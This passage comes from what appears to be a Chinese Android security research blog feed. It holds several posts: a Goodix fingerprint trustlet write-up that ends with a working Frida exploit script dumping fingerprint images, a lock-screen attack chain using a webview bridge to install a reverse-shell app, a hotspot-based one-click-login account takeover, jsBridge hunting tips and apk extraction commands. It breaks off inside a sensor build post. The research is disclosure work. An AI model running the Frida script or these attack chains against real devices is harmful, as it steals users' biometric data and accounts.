g_product_test_ctx”推断g_product_test_ctx维护一个g_product_test_module下的函数调用表，根据不同的index，调用对应的函数。根据上文中构造的函数表，sz_factory_test_capture_image的索引为22</p><p>由于64位系统地址占8个字节，sz_factory_test_capture_image对应的偏移为176，对应的cmd_id为0x11。<br><img src="/images/pasted-233.png" alt="upload successful"></p><p>因此，sz_factory_test_capture_image 对应的module_id为0xEB,cmd_id为0x11。<br><img src="/images/pasted-230.png" alt="upload successful"></p><h3 id="libgf-ud-hal-so逆向分析"><a href="#libgf-ud-hal-so逆向分析" class="headerlink" title="libgf_ud_hal.so逆向分析"></a>libgf_ud_hal.so逆向分析</h3><p>libgf_ud_hal.so中有一个函数goodix::SZCustomizedProductTest::factoryCaptureImage()会通过libQSEEComAPI最终调用TA中的sz_factory_test_capture_image。</p><p><img src="/images/pasted-234.png" alt="upload successful"></p><p>factoryCaptureImage有5个参数：<br>arg0: goodix::SZCustomizedProductTest对象<br>arg1: dump出来的图片buffer<br>arg2: ae_expo_start_time,可通过调用getSensorInfo()得到<br>arg3: 固定为1<br>arg4: 固定为0<br>因此，只要构造合适的参数，调用factoryCaptureImage()就可以dump出指纹图片。重点在于arg0和arg2的构造上。</p><p>经过分析，创建SZCustomizedProductTest对象需要HalContext，而HalContext可以通过hook其他函数得到，利用frida我们可以成功的调用factoryCaptureImage函数。</p><p>利用思路如下：</p><ol><li>hook goodix::FingerprintCore::onAfterAuthSuccess函数得到HalContext（该函数会在指纹认证成功时触发，也可以hook其他函数得到HalContext）</li><li>调用goodix::createProductTest创建一个goodix::SZCustomizedProductTest对象</li><li>调用goodix::SZCustomizedProductTest::getSensorInfo获取ae_expo_start_time</li><li>调用goodix::factoryCaptureImage dump指纹图片</li></ol><h2 id="漏洞利用代码"><a href="#漏洞利用代码" class="headerlink" title="漏洞利用代码"></a>漏洞利用代码</h2><p>利用frida写的exp代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">var halbase = ptr(0x0);  </span><br><span class="line">var logprint = Module.getExportByName(&apos;liblog.so&apos;, &apos;__android_log_print&apos;);</span><br><span class="line">var createproducttestPtr = Module.getExportByName(&apos;libgf_ud_hal.so&apos;, &apos;_ZN6goodix17createProductTestEPNS_10HalContextE&apos;);</span><br><span class="line">var createproducttest = new NativeFunction(createproducttestPtr, &apos;pointer&apos;, [&apos;pointer&apos;, &apos;pointer&apos;])</span><br><span class="line">var getsensorinfoptr = Module.getExportByName(&apos;libgf_ud_hal.so&apos;, &apos;_ZN6goodix23SZCustomizedProductTest13getSensorInfoEP15GF_SZ_CHIP_INFO&apos;);</span><br><span class="line">var getsensorinfo = new NativeFunction(getsensorinfoptr, &apos;int&apos;, [&apos;pointer&apos;, &apos;pointer&apos;])</span><br><span class="line">var captureimgptr = Module.getExportByName(&apos;libgf_ud_hal.so&apos;, &apos;_ZN6goodix23SZCustomizedProductTest19factoryCaptureImageEP18GF_SZ_TEST_RAWDATAtht&apos;);</span><br><span class="line">var captureimgfactory = new NativeFunction(captureimgptr, &apos;int&apos;, [&apos;pointer&apos;, &apos;pointer&apos;,&apos;uint16&apos;,&apos;uint8&apos;,&apos;uint16&apos;])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var onAfterAuthSuccess = Module.getExportByName(&apos;libgf_ud_hal.so&apos;, &apos;_ZN6goodix15FingerprintCore18onAfterAuthSuccessEPNS0_19AuthenticateContextE&apos;);</span><br><span class="line">Interceptor.attach(onAfterAuthSuccess, &#123;</span><br><span class="line">  onEnter: function (args) &#123;</span><br><span class="line">    </span><br><span class="line">    console.log(&quot;onAfterAuthSuccess:&quot;+args[0]);</span><br><span class="line">    halbase = args[0].add(8);  </span><br><span class="line">    console.log(&quot;halbase:&quot;+halbase.readPointer());</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">function xxx()&#123;</span><br><span class="line">    //console.log(&quot;halbase context:&quot;+halbase.readPointer())</span><br><span class="line">    </span><br><span class="line">    var instance = createproducttest(halbase,ptr(0));</span><br><span class="line">    var xxx = Memory.alloc(1024);</span><br><span class="line">    var yyy = getsensorinfo(instance,xxx);</span><br><span class="line">    var ae_expo_start_time = xxx.add(48).readUInt()</span><br><span class="line">    console.log(&quot;ae_expo_start_time:&quot;+ae_expo_start_time);</span><br><span class="line"></span><br><span class="line">    var zzz = Memory.alloc(86024);</span><br><span class="line">    var jjj = captureimgfactory(instance,zzz,ae_expo_start_time,1,0)</span><br><span class="line">    //console.log(jjj)</span><br><span class="line">    if(jjj == 0)&#123;</span><br><span class="line">      console.log(hexdump(zzz, &#123; length: 100, ansi: true &#125;));</span><br><span class="line">      console.log(&quot;dump success&quot;);</span><br><span class="line">      send(&apos;aaa&apos;,Memory.readByteArray(zzz, 86024))</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setInterval(xxx, 50);</span><br></pre></td></tr></table></figure></p><p>exp设置每50毫秒dump一次，dump出来的指纹图片如下：</p><p><img src="/images/pasted-235.png" alt="upload successful"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>漏洞从根本上修复需要从TA里删除对应的代码，仅从libgf_ud_hal.so中删掉goodix::factoryCaptureImage函数是没用的，攻击者可以直接调用goodix::HalBase::invokeCommand构造对应的参数以实现对TA里函数的调用。</p><p>另外，除了dump指纹图片外，攻击者可以调用TA里4个module里的其他函数，因此，手机厂商在设备发布前需要仔细检查TA中的非必要代码。</p><p>参考资料：<br><a href="https://www.synopsys.com/blogs/software-security/cve-2020-7958-trustlet-tee-attack/" target="_blank" rel="noopener">https://www.synopsys.com/blogs/software-security/cve-2020-7958-trustlet-tee-attack/</a></p><p><a href="https://research.checkpoint.com/2019/the-road-to-qualcomm-trustzone-apps-fuzzing/" target="_blank" rel="noopener">https://research.checkpoint.com/2019/the-road-to-qualcomm-trustzone-apps-fuzzing/</a></p><p><a href="http://bits-please.blogspot.com/2016/04/exploring-qualcomms-secure-execution.html" target="_blank" rel="noopener">http://bits-please.blogspot.com/2016/04/exploring-qualcomms-secure-execution.html</a></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Android锁屏状态下的安全分析</title>
      <link href="/2020/06/11/ndroid%E9%94%81%E5%B1%8F%E7%8A%B6%E6%80%81%E4%B8%8B%E7%9A%84%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/"/>
      <url>/2020/06/11/ndroid%E9%94%81%E5%B1%8F%E7%8A%B6%E6%80%81%E4%B8%8B%E7%9A%84%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Android从6.0开始，默认开启了全盘加密（Full Disk Encryption，即FDE），设备开机后第一次解锁时，用户数据处于加密状态，大多数功能在开机解锁前不可用。如下图：</p><p><img src="/images/pasted-219.png" alt="upload successful"></p><p>如果没有输入正确的密码，用户数据是解不开的，因此在这一状态下即使物理控制设备，想要进一步攻破设备或者窃取数据也是极其困难的。</p><p>用户输入正确的密码后，进入系统，数据解开，所有功能正常使用。当再次锁屏时，必须要解锁后才会进入系统，但这一状态下也是有部门功能处于可用状态，例如下滑查看设置页面、手电筒、闹钟、计算器、锁屏壁纸等功能。</p><p>如果锁屏状态下的系统设计存在安全问题，攻击者在接触到用户设备后，就可能窃取用户数据，设置完全解锁手机。因此，本文主要讨论在手机不关机情况下，锁屏状态下的安全问题。</p><h2 id="攻击面分析"><a href="#攻击面分析" class="headerlink" title="攻击面分析"></a>攻击面分析</h2><p>锁屏状态下，所有可用的功能都有可能是一个攻击入口或载体，这里主要总结如下：</p><h3 id="锁屏下的数据交互"><a href="#锁屏下的数据交互" class="headerlink" title="锁屏下的数据交互"></a>锁屏下的数据交互</h3><p>手机虽然处于锁屏状态，但还是可以接收推送消息、刷公交卡等，这就意味着锁屏下存在着数据交互，例如网络数据、蓝牙数据、NFC数据等，大多数情况下这些数据都是被动生成的，虽无法造成严重的安全问题，但有可能存在数据泄露。典型的场景可能有：</p><ul><li>结合Kama攻击抓取wifi流量（锁屏下无法设置wifi）</li><li>开启NFC直接进行支付</li><li>冒充蓝牙设备进行通信等</li></ul><h3 id="语音助手"><a href="#语音助手" class="headerlink" title="语音助手"></a>语音助手</h3><p>语音助手几乎是只能手机的标配，且其功能注定了锁屏下处于可用状态。如果语音助手的设计有问题，可能在锁屏下泄露用户数据。例如唤起某些APP、泄露用户个人信息、唤起智能家居甚至完成支付，严重时甚至直接跳过锁屏界面。</p><p>通过逆向语音助手APP的实现，可以挖掘更多的攻击面。</p><h3 id="不安全的Activity跳转"><a href="#不安全的Activity跳转" class="headerlink" title="不安全的Activity跳转"></a>不安全的Activity跳转</h3><p>先前有很多直接绕过锁屏进入activity的案例，其根本原因是在锁屏下调用startActivity时，未判断是否解锁。如果未解锁的话，需要调用KeyguardManager的requestDismissKeyguard调出解锁页面。</p><h3 id="辅助屏幕（Lock-screen-on-secondary-display）"><a href="#辅助屏幕（Lock-screen-on-secondary-display）" class="headerlink" title="辅助屏幕（Lock screen on secondary display）"></a>辅助屏幕（Lock screen on secondary display）</h3><p>根据Android<a href="https://source.android.google.cn/devices/tech/display/multi_display/lock-screen" target="_blank" rel="noopener">官方文档</a>，手机厂商可以为辅助显示屏实现其自己的锁定屏幕，只需要设置要显示的Activity属性（Manifest文件中设置对应Activity的showWhenLocked为true或动态设置Activity.setShowWhenLocked(true)）。</p><p>根据文档描述，设备锁定时应显示或隐藏哪些内容，没有相关的内置政策或控制，完全取决于开发者的设置，因此如果配置不当，则有可能导致敏感信息在锁屏页显示。</p><p>比较常见的案例是锁屏壁纸，国内四大厂商都在锁屏页默认开启了锁屏壁纸，在锁屏状态下可以滑动和浏览壁纸，设置可以收藏、点赞和评论，个别厂的锁屏壁纸还插入了广告，点击后调起webview,无疑增加了更多的攻击面。</p><h2 id="某锁屏杂志分析"><a href="#某锁屏杂志分析" class="headerlink" title="某锁屏杂志分析"></a>某锁屏杂志分析</h2><p>前一阵子在某厂的手机上乱点，竟然直接点进了google主页，这里作简单的记录。</p><p>点击触发路径：<br>任意一张锁屏壁纸 -&gt; 阅读全文  -&gt;  刷出某厂自己的广告 -&gt;  页面最下方隐私政策 -&gt; 点隐私政策里的超链接 -&gt; 进入到google -&gt; 进入任意页面</p><p>该锁屏壁纸点击详情后，用webview渲染内容，且webview注册了jsinterface接口，用来处理登录、下载和安装APP、利用Deeplink唤起页面等操作。</p><p>基于这些jsinterface，一条完美的攻击链如下：</p><ol><li>攻击者开发恶意APP，其Activity中带reverse shell且showWhenLocked为true，并配置deeplink</li><li>利用上述路径使webview加载攻击者的页面</li><li>利用jsinterface下载和安装准备好的恶意APP</li><li>利用deeplink唤起activity，得到锁屏下的shell</li></ol><p>需要注意的是，动态权限的弹窗会直接触发解锁页面，所以一定程度上讲，该攻击造成的效果有限。</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>一个手机热点泄露你所有的账户信息？</title>
      <link href="/2020/02/20/%E6%9C%AC%E6%9C%BA%E5%8F%B7%E7%A0%81%E4%B8%80%E9%94%AE%E7%99%BB%E5%BD%95%E7%9A%84%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/"/>
      <url>/2020/02/20/%E6%9C%AC%E6%9C%BA%E5%8F%B7%E7%A0%81%E4%B8%80%E9%94%AE%E7%99%BB%E5%BD%95%E7%9A%84%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>在移动互联网生活中，用手机建立热点共享网络是一个很常见的场景，无论是Android还是iOS系统，简单的几步操作就可以迅速的建立热点，将你的4G网络分享给他人使用。</p><p>由于连接热点的热备和宿主之间网络互通，操作系统做了很多隔离和保护措施，以保障热点的安全使用，通过热点的机制去攻击宿主操作系统是一件很困难的事情。尽管如此，随着一些新兴业务的开展，通过热点窃取你所有账户也成为了可能……</p><p>手机热点背后到底泄露了什么东西？这要从“手机号码一键登录”开始说起。</p><h2 id="0x0-什么是“手机号码一键登录”"><a href="#0x0-什么是“手机号码一键登录”" class="headerlink" title="0x0 什么是“手机号码一键登录”"></a>0x0 什么是“手机号码一键登录”</h2><p>移动互联网时代，手机里APP的数量越来越多，而初次使用APP通常采用“手机号+验证码”的方式进行注册，填写验证码是一个非常麻烦的事情，早期的APP直接获取短信权限，从短信中提取出验证码帮用户填好，但随着用户隐私意识的加强通常不会赋给APP读取短信的权限，于是就只能手动去短信中找出验证码，多次点击跳转复制粘贴的操作使注册流程变动非常繁琐。</p><p>为了解决这个用户痛点，运营商推出了“手机号码一键登录”这个技术（也叫“本机号码一键登录”、“手机号免密登录”等），彻底告别了验证码。</p><p>例如手机上打开”货拉拉“，APP会自动获取你手机号，点击”本机号码一键登录“后这个按钮后，APP会直接使用你的手机号进行注册登录,整个过程中不需要任何验证码，做到了真正的一键登录。</p><p><img src="/images/onekey.gif" alt="upload successful"></p><p>如此简单的交互彻底解决了APP在注册和登录时的痛点，告别了烦人的短信验证码，为互联网应用提供全新的用户账号认证一站式解决方案。</p><p>然而，作为一名安全研究人员，看到自己的手机号在没有任何权限提示的情况下直接被显示了出来，自然而然的产生了警觉。为了探索这种技术的安全性，我对其背后的原理进行了分析。</p><h2 id="0x1-一键登录的原理"><a href="#0x1-一键登录的原理" class="headerlink" title="0x1 一键登录的原理"></a>0x1 一键登录的原理</h2><p>我们带着几个疑问去解释一键登录的原理。</p><h3 id="1-手机号能被APP获取吗？"><a href="#1-手机号能被APP获取吗？" class="headerlink" title="1.手机号能被APP获取吗？"></a>1.手机号能被APP获取吗？</h3><p>正常情况下，APP是无法读取手机号的，即使给了APP所有的权限，它也读取不了。但Android确实提供了一个读取手机号的API —getLine1Number，使用这个API读取手机号的前提是手机号已经明文硬写在了SIM卡中,然而很多SIM卡是没有硬写入手机号码的，因此APP是读不到手机号的，那么通过“本机号码一键登录”的方法是如何拿到手机号的呢？想来想去，也只有和运营商合作了。</p><p>事实上，在使用“一键登录“时，必须要打开手机的数据流量，只开启wifi的情况下无法使用这种技术，这样进一步印证了该技术和运营商有关。</p><h3 id="2-运营商为什么能拿到手机号？"><a href="#2-运营商为什么能拿到手机号？" class="headerlink" title="2.运营商为什么能拿到手机号？"></a>2.运营商为什么能拿到手机号？</h3><p>这就有点废话了，SIM卡本来就是运营商核发的，当然知道哪个卡对应哪个手机号。这里可能是APP搜集了imsi、iccid等SIM卡上的信息，用这些信息去运营商查询手机号码，也可能是运营商直接从网关处获取手机号返回给APP端，具体细节后文再详细分析。</p><p>所以我们猜测一键登录的原理大概是: APP使用数据流量发送一个数据包，运营商根据这个数据包就可以查出是哪个sim卡发出的，进而也就知道了发送方的手机号码，把这个手机号返回给APP就可以了。</p><p>然而市场上纷乱的APP是不可能直接从运营商那边直接获取用户手机号码的，那么他们是如何合作的呢？</p><h3 id="3-APP如何和运营商合作？"><a href="#3-APP如何和运营商合作？" class="headerlink" title="3.APP如何和运营商合作？"></a>3.APP如何和运营商合作？</h3><p>我们对”手机号一键登录“进行了逆向分析，发现其工作流程如下：</p><p><img src="/images/pasted-204.png" alt="upload successful"></p><p>其中：</p><ol><li>APP利用数据流量向运营商服务器发起请求</li><li>运营商返回带掩码的手机号（例如176_**_1234）和以及一个accessCode</li><li>APP携带accessCode向APP服务端发起请求获取明文手机号</li><li>APP的服务端带着accessCode访问运营商服务端</li><li>运营商将手机号密文和公钥返回给APP服务端</li><li>APP服务端解密后完成注册和登录逻辑</li></ol><p>（因各个运营商的实现机制不同，上述流程可能存在细节性的差异，但核心原理基本相同）</p><p>上述流程和一个第三方的OAuth机制非常相似，也许不同运营商在实现上存在一些和常见OAuth漏洞那样相似的安全问题，例如Access Token复用、越权等，但这里我们抛开这些实现上的问题，分析一种更严重的安全隐患。</p><p>上文中我们提到APP端可能上传了imsi、iccid等SIM卡的信息去置换获取了手机号码，我们通过hook技术，把和SIM卡相关的信息全部置空，发现一键登录依然可以正常使用。此外，这种方式在正常的wifi连接下也能实现，APP也没有必要强制用户打开数据流量使用。因此，运营商大概率直接从网关处获取手机号码的，“一键登录”技术使用的核心就是4G网络。</p><p>传统的使用手机验证码登录的方式，本质上是借助“用户的手”，实现了对手机号和SIM卡一致性的验证。新兴的“一键登录”的技术，本质上是利用运营商的移动网络，完成了对手机号和SIM卡一致性的验证。前者借助了人，但会令人感到繁琐。后者借助了网络，似乎更加简单和完美。但缺少了人这一层“验证”，安全却大打折扣了。</p><h2 id="0x2-一键登录的安全风险"><a href="#0x2-一键登录的安全风险" class="headerlink" title="0x2 一键登录的安全风险"></a>0x2 一键登录的安全风险</h2><p>“一键登录”的本质是借用了运营商的移动网络，如果攻击者也可以使用受害者的4G网络，就意味着可以使用“一键登录”窃取受害者账号了。</p><p>简单的想，攻击者可以偷取受害者的SIM卡去使用“一键登录”，但事实上，如果有SIM卡的话，攻击者完全可以用验证码的方式登录了，而没必要“一键登录”，这属于典型的物理接触攻击。也许你想过用“补卡攻击”、“SIM卡克隆”等各种花式攻击手段，但严格来说这不能算是严重安全问题。</p><p>那么如何在不接触SIM卡的前提下去使用他人的4G网络呢？这就回到了本文的标题 —— 手机热点。</p><h3 id="1-利用手机热点窃取账号"><a href="#1-利用手机热点窃取账号" class="headerlink" title="1.利用手机热点窃取账号"></a>1.利用手机热点窃取账号</h3><p>手机热点是最简单的共享4G网络的方式，我们成功实现了一套攻击流程。</p><p>我们用A手机的数据流量建立热点，使用无SIM卡的B手机通过热点进行连接，并强行进入一键登录页面，最终显示获取的手机号是A，且成功登录上了A的账户。</p><p>（当然，具体的实现细节远不止这么简单，你需要做到“让B手机上的APP认为它正在使用4G网络，但实际上它却是连着wifi热点”，此外，各大运营商均有不同复杂安全策略需要绕过，所以具体的攻击代码在这里就不分享了）</p><p>除了一键登录外，我们还可以一键注册，即使受害者从未使用自己的手机号注册过某APP,攻击者可以提前用他的手机号进行“抢注”。</p><p>整个登录或者注册过程，受害者仅仅是共享了一个热点，却丝毫未察觉他手机上各种APP的账号已经被攻击者登录了，甚至是他未注册的APP也被提前注册了，仔细想想是一件多么可怕的事情。</p><h3 id="2-在受害者手机上安装恶意APP"><a href="#2-在受害者手机上安装恶意APP" class="headerlink" title="2.在受害者手机上安装恶意APP"></a>2.在受害者手机上安装恶意APP</h3><p>通过热点的方式进行攻击是基于双方在一定的信任前提下的，如果说这种方式比较low的话，我们介绍另一种更low的方式 —— 在受害者手机上安装恶意APP。</p><p>原理不用细说，恶意APP无非就是为了把受害者手机上的网络共享出去，通过建立一个网络代理，将远端攻击者“一键登录”的流量通过受害者的4G网络发出去，再把运营商返回的数据转给远端攻击者。</p><p>既然APP都装到受害者手机上了，本身就可以使用4G网络了，干嘛还要搞个代理那么麻烦，直接逆向各大APP的协议，模拟各个APP进行“一键登录”就好了。</p><p>在各个品牌手机严控安装来源的策略上，安装恶意APP固然是很low的，但和手机热点攻击的方式相比，攻击距离可以不受限制。</p><h3 id="3-利用浏览器漏洞建立网络代理"><a href="#3-利用浏览器漏洞建立网络代理" class="headerlink" title="3.利用浏览器漏洞建立网络代理"></a>3.利用浏览器漏洞建立网络代理</h3><p>如果说安装恶意APP很low的话，这个时候就需要祭出浏览器漏洞了，浏览器漏洞可以实现点一个链接就可以RCE的效果，RCE下建立一个网络代理自然也不是问题了。</p><p>但我都可以手机上RCE了，拿到所有APP的token进行登录也不是什么问题了，“一键登录”唯一可利用的地方也就是用手机号抢注一些APP了。</p><p>需要注意的是，这里的RCE必须是APP进程下的RCE或者突破沙箱下的浏览器的RCE,毕竟浏览器的Render下的RCE连Socket都建不了，更不用提建立网络代理了。</p><p>当然，到这一步我们没有再实现了。</p><h2 id="0x4-影响分析"><a href="#0x4-影响分析" class="headerlink" title="0x4 影响分析"></a>0x4 影响分析</h2><p>“手机号一键登录”这个漏洞原理看似简单，但其影响范围是非常大的，其主要表现在：</p><ul><li>与系统无关，Android和iOS设备都可以建热点</li><li>漏洞场景简单，受害者账号被登录后几乎无察觉</li><li>攻击者可以提前于受害者“抢注”账户</li><li>使用手机号一键登录的APP较多</li></ul><p>这些受影响的APP大都是集成了“本机号码一键登录”的SDK，通过扫描后发现，Top 100 APP中有23款应用存在问题，其中不乏如京东、抖音、今日头条、百度等大厂软件，具体的列表考虑到其他因素就不贴了。所以毫不夸张的讲，分享一个热点，你手机上的“半壁江山”可能都被别人盗取了。</p><p>其中，提供“手机号一键登录”的运营商：</p><ul><li>中国移动 <a href="http://dev.10086.cn/idenLogin" target="_blank" rel="noopener">http://dev.10086.cn/idenLogin</a></li><li>中国联通 <a href="http://dev.wo.cn/aep/consumerCapDetail.html?apiPackageId=00000000-0000-0000-0000-500000401000" target="_blank" rel="noopener">http://dev.wo.cn/aep/consumerCapDetail.html?apiPackageId=00000000-0000-0000-0000-500000401000</a></li><li>中国电信 <a href="https://id.189.cn/api?initialSrc=/html/api_detail_445.html" target="_blank" rel="noopener">https://id.189.cn/api?initialSrc=/html/api_detail_445.html</a></li></ul><p>这些官方的SDK支持的运营商也各有差异，其中电信的SDK支持三大运营商手机号码，移动的SDK也支持联通号码，联通的SDK仅支持自己。也正是由于这些官方SDK的支持不一，出现了各种同时支持三大运营商的第三方SDK，比较典型的有：</p><ul><li>闪验 <a href="https://flash.253.com/" target="_blank" rel="noopener">https://flash.253.com/</a></li><li>极验 <a href="https://docs.geetest.com/onelogin/overview/start/" target="_blank" rel="noopener">https://docs.geetest.com/onelogin/overview/start/</a></li><li>极光认证 <a href="https://docs.jiguang.cn/jverification/guideline/intro/" target="_blank" rel="noopener">https://docs.jiguang.cn/jverification/guideline/intro/</a></li><li>秒验 <a href="http://www.mob.com/mobService/secverify" target="_blank" rel="noopener">http://www.mob.com/mobService/secverify</a></li><li>LinkedME <a href="https://www.linkedme.cc/linkaccount.html?1023" target="_blank" rel="noopener">https://www.linkedme.cc/linkaccount.html?1023</a><br>等等</li></ul><p>这些SDK完成一次登录的费用远低于短信验证码的费用，这也是“手机号一键登录”技术除了便捷外，能够很快普及，被各大厂APP使用的另一个原因。</p><p>此外，除了国内的运营商使用了“手机号一键登录”技术，也有国外的运营商使用同样技术。例如，美国四大电信商AT&amp;T、Sprint、T-Mobile和Verizon结盟，联手提出了验证计划<a href="https://www.mobileauthtaskforce.com/" target="_blank" rel="noopener">Mobile Authentication Taskforce</a>，限于SIM卡资源问题，我们没有对其进行研究。</p><h2 id="0x5-后记"><a href="#0x5-后记" class="headerlink" title="0x5 后记"></a>0x5 后记</h2><p>这个漏洞在GeekPwn 2019上已经被选手演示了，参考<a href="http://2019.geekpwn.org/zh/index.html" target="_blank" rel="noopener">我只是开了一个手机热点，为什么我的账号都被盗了</a>。截止在本文发布之时，多数之前存在漏洞的APP已经作了修复。我在19年7月份发现的这个漏洞，后因其他事情没有继续研究下去，本文对之前的研究进行了整理。</p><h3 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h3><ol><li>APP本机号码一键登录如何实现？ <a href="https://www.zhihu.com/question/316829163" target="_blank" rel="noopener">https://www.zhihu.com/question/316829163</a></li><li>惊！！！网站居然可以不经授权获取用户手机号码 <a href="https://www.v2ex.com/t/497976" target="_blank" rel="noopener">https://www.v2ex.com/t/497976</a></li><li>移动验证：本机校验和一键登录  <a href="https://blog.csdn.net/peng_up/article/details/84024991" target="_blank" rel="noopener">https://blog.csdn.net/peng_up/article/details/84024991</a></li><li>极光大数据：移动认证再进化，一键登录或成大势所趋 <a href="http://biz.ifeng.com/a/20190306/45334883_0.shtml" target="_blank" rel="noopener">http://biz.ifeng.com/a/20190306/45334883_0.shtml</a></li><li>本机号码一键登录 <a href="https://mp.weixin.qq.com/s/CLhBn5pmOVA1TYbRYCqTtg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/CLhBn5pmOVA1TYbRYCqTtg</a></li><li>好奇一键登录是怎么实现的吗？进来了解一下 <a href="https://mp.weixin.qq.com/s/91gvgalgwag44gdluPIvLg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/91gvgalgwag44gdluPIvLg</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Android通用的jsBridge漏洞挖掘</title>
      <link href="/2019/12/11/%E9%80%9A%E7%94%A8%E7%9A%84jsBridge/"/>
      <url>/2019/12/11/%E9%80%9A%E7%94%A8%E7%9A%84jsBridge/</url>
      
        <content type="html"><![CDATA[<h2 id="1-定位jsBridge"><a href="#1-定位jsBridge" class="headerlink" title="1. 定位jsBridge"></a>1. 定位jsBridge</h2><pre><code>- Smali静态查找    - 调用 addjavascriptinterface函数    - 静态 使用@JavascriptInterface annotation的- 动态hook    - hook addjavascriptinterface函数    - 第三方webview, 枚举所有类，看是否有addjavascriptinterface函数,进而hook- Chrome远程调试，window.object找到导出的js对象</code></pre><h2 id="2-找到所有WebView组件"><a href="#2-找到所有WebView组件" class="headerlink" title="2. 找到所有WebView组件"></a>2. 找到所有WebView组件</h2><pre><code>- 跟踪Menifest文件里带webview的组件- Activity里继承WebView的- 第三方webview, 枚举所有类，看是否继承webview，或有webview的成员函数</code></pre><h2 id="3-找特权域白名单"><a href="#3-找特权域白名单" class="headerlink" title="3. 找特权域白名单"></a>3. 找特权域白名单</h2><pre><code>如果存在，在每次执行导出的java方法时都会判断- getHost - getUrl- contain, indexof, startswith等</code></pre><h2 id="4-打开debug模式"><a href="#4-打开debug模式" class="headerlink" title="4. 打开debug模式"></a>4. 打开debug模式</h2><pre><code>- 调用setWebContentsDebuggingEnabled函数- 少数app里有隐藏的开关</code></pre>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>提取设备中的apk文件</title>
      <link href="/2019/10/10/%E6%8F%90%E5%8F%96%E8%AE%BE%E5%A4%87%E4%B8%AD%E7%9A%84apk%E6%96%87%E4%BB%B6/"/>
      <url>/2019/10/10/%E6%8F%90%E5%8F%96%E8%AE%BE%E5%A4%87%E4%B8%AD%E7%9A%84apk%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<p>测试的时候经常需要从设备中提取apk文件，通常情况下，普通apk安装包位于/data/app/目录下，系统apk位于/system/app或/system/priv-app/目录下，结合包名就可以找到apk文件的路径，由于全局可读，所以直接dump出来就可以。</p><p>Android 8.0之后，apk文件的路径添加了随机字符，例如“/data/app/com.tencent.mobileqq-onrUh_8jpKjlW5JhNSDwNQ==/base.apk”，这就给提取apk文件带来了困难。然而有一个命令是可以很方便找到这个路径的，那就是pm path。</p><p>不仅仅普通apk，连系统apk路径也能显示出来<br><img src="/images/pasted-198.png" alt="upload successful"></p><p>之后直接adb pull /data/data/com.x.x.x/app_name.apk就可以拿到apk文件了。</p><p>附一些可能用到的命令：</p><ul><li><p>pm list packages<br>列出所有安装的apk</p></li><li><p>pm list packages -f<br>列出APK的路径</p></li><li><p>pm list packages -s<br>列出所有的system APP</p></li><li><p>pm list packages -3<br>列出所有的第三方APP</p></li><li><p>pm list packages keywords<br>匹配关键字的包名</p></li></ul><p>提取所有可执行文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / 2&gt;/dev/null|grep -E &apos;\.jar|\.apk|\.so|\.dex&apos; | xargs grep &quot;xxxx&quot;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>自制甲醛测试仪</title>
      <link href="/2019/07/05/%E8%87%AA%E5%88%B6%E7%94%B2%E9%86%9B%E6%B5%8B%E8%AF%95%E4%BB%AA/"/>
      <url>/2019/07/05/%E8%87%AA%E5%88%B6%E7%94%B2%E9%86%9B%E6%B5%8B%E8%AF%95%E4%BB%AA/</url>
      
        <content type="html"><![CDATA[<p>因家里装修，自制了一个甲醛测试仪，在此记录下主要过程。</p><h3 id="1-材料："><a href="#1-材料：" class="headerlink" title="1.材料："></a>1.材料：</h3><ul><li>1.树莓派Zero W</li><li>2.ZE08-CH2O传感器（UART接口）</li><li>3.ssd1306 128*64 I2C接口</li></ul><p>其中，CH2O传感器是核心部件，主要用来采集甲醛含量。树莓派用来读取传感器上的数据，ssd1306用来显示数据。</p><p>最终效果如下图：</p><p><img src="/images/pasted-206.png" alt="upload successful"></p><h3 id="2-接线方式"><a href="#2-接线方式" class="headerlink" title="2.接线方式"></a>2.接线方式</h3><p>一、 树莓派Zero W引脚：</p><p><img src="/images/pasted-209.png" alt="upload successful"></p><p>二、 ZE08引脚</p><p><img src="/images/pasted-207.png" alt="upload 